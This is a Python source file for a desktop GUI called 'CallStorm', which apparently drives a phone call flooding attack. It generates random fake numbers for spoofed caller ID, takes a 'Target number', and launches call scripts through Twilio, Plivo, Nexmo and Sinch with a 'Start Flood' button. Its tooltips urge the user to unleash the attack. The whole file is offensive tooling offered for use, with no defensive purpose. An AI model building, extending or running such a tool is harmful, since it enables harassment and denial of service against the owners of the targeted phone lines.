import customtkinter as ctk
import subprocess
import random
import tkinter.messagebox as messagebox
from Config_Files.config import voiceml
from Source_Numbers.source_numbers import sourceNumbers

processes = []

def generate_phone_number():
    country_code = "+1" 
    number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    return f"{country_code}{number}"

def update_source_numbers_file(phone_numbers, source_numbers_file_path='Source_Numbers/source_numbers.py'):
    with open(source_numbers_file_path, 'r') as file:
        lines = file.readlines()
    
    for i, line in enumerate(lines):
        if line.strip().startswith("sourceNumbers ="):
            lines[i] = f"sourceNumbers = {phone_numbers}\n"
            break

    with open(source_numbers_file_path, 'w') as file:
        file.writelines(lines)

def generate_numbers_and_update_source():
    num_of_numbers = int(entry_num_count.get())
    generated_numbers = [generate_phone_number() for _ in range(num_of_numbers)]
    print("Generated phone numbers:", generated_numbers)
    update_source_numbers_file(generated_numbers)
    print(f"Updated {len(generated_numbers)} phone numbers in source_numbers.py")
    label_status.configure(text=f"Generated {len(generated_numbers)} phone numbers.")

def run_script(script_name, numToCall):
    try:
        process = subprocess.Popen(['python', f'Call_Services/{script_name}', numToCall])
        processes.append(process)
        print(f"Started {script_name} with target {numToCall}")
    except Exception as e:
        print(f"Error running {script_name}: {e}")

def start_call_flood():
    numToCall = entry_number.get()
    if var_twilio.get():
        run_script('twilio_call.py', numToCall)
    if var_plivo.get():
        run_script('plivo_call.py', numToCall)
    if var_nexmo.get():
        run_script('nexmo_call.py', numToCall)
    if var_sinch.get():
        run_script('sinch_call.py', numToCall)

def stop_call_flood():
    global processes
    for process in processes:
        process.terminate()
        process.wait()
    processes = []
    print("Stopped all running scripts")

def on_closing():
    stop_call_flood()
    app.destroy()

def show_info(message):
    messagebox.showinfo("Information", message)

app = ctk.CTk()
app.geometry("300x550")
app.title("Call㉿Storm")

frame = ctk.CTkFrame(master=app)
frame.pack(pady=20, padx=10, fill="both", expand=True)

label = ctk.CTkLabel(master=frame, text="㉿ CallStorm ㉿")
label.grid(row=0, column=0, columnspan=2, pady=12, padx=10, sticky="ew")

entry_number = ctk.CTkEntry(master=frame, placeholder_text="㉿ Target number ㉿")
entry_number.grid(row=1, column=0, pady=12, padx=10, sticky="ew")
info_button_1 = ctk.CTkButton(master=frame, text="㉿", width=20, command=lambda: show_info("Enter the Target number you want to call"))
info_button_1.grid(row=1, column=1, pady=10, padx=50, sticky="w")

entry_num_count = ctk.CTkEntry(master=frame, placeholder_text="㉿ Numbers 1-100+ ㉿")
entry_num_count.grid(row=2, column=0, pady=12, padx=10, sticky="ew")
info_button_2 = ctk.CTkButton(master=frame, text="㉿", width=20, command=lambda: show_info("Enter 1 - 100+ to generate that many Fake numbers you wish to use for calling and show up on caller ID. Stored and created in the source_numbers.py"))
info_button_2.grid(row=2, column=1, pady=10, padx=50, sticky="w")

button_generate = ctk.CTkButton(master=frame, text="Generate Numbers", command=generate_numbers_and_update_source)
button_generate.grid(row=3, column=0, pady=12, padx=10, sticky="ew")
info_button_3 = ctk.CTkButton(master=frame, text="㉿", width=20, command=lambda: show_info("Generates the amount of (RANDOM NUMBERS) you added above 1 - 100+ "))
info_button_3.grid(row=3, column=1, pady=10, padx=50, sticky="w")

var_twilio = ctk.BooleanVar()
var_plivo = ctk.BooleanVar()
var_nexmo = ctk.BooleanVar()
var_sinch = ctk.BooleanVar()

check_twilio = ctk.CTkCheckBox(master=frame, text="Twilio", variable=var_twilio)
check_twilio.grid(row=4, column=0, pady=12, padx=10, sticky="w")
info_button_4 = ctk.CTkButton(master=frame, text="㉿", width=20, command=lambda: show_info("Choose one of the calling services you want to use on the target. You can choose more than one, or all of them."))
info_button_4.grid(row=4, column=1, pady=10, padx=50, sticky="w")

check_plivo = ctk.CTkCheckBox(master=frame, text="Plivo", variable=var_plivo)
check_plivo.grid(row=5, column=0, pady=12, padx=10, sticky="w")

check_nexmo = ctk.CTkCheckBox(master=frame, text="Nexmo", variable=var_nexmo)
check_nexmo.grid(row=6, column=0, pady=12, padx=10, sticky="w")

check_sinch = ctk.CTkCheckBox(master=frame, text="Sinch", variable=var_sinch)
check_sinch.grid(row=7, column=0, pady=12, padx=10, sticky="w")

button_start = ctk.CTkButton(master=frame, text="Start Flood", command=start_call_flood)
button_start.grid(row=8, column=0, pady=12, padx=10, sticky="ew")
info_button_5 = ctk.CTkButton(master=frame, text="㉿", width=20, command=lambda: show_info("UNLEASH YOUR GLORY TO THE HUMAN RACE!!!"))
info_button_5.grid(row=8, column=1, pady=10, padx=50, sticky="w")

button_stop = ctk.CTkButton(master=frame, text="Stop Flood", command=stop_call_flood)
button_stop.grid(row=9, column=0, pady=12, padx=10, sticky="ew")
info_button_6 = ctk.CTkButton(master=frame, text="㉿", width=20, command=lambda: show_info("Really??? I didn't expect anyone to press this."))
info_button_6.grid(row=9, column=1, pady=10, padx=50, sticky="w")

label_status = ctk.CTkLabel(master=frame, text="")
label_status.grid(row=10, column=0, columnspan=2, pady=12, padx=10)

app.protocol("WM_DELETE_WINDOW", on_closing)

try:
    app.mainloop()
except KeyboardInterrupt:
    print("Application closed by user.")
    stop_call_flood()
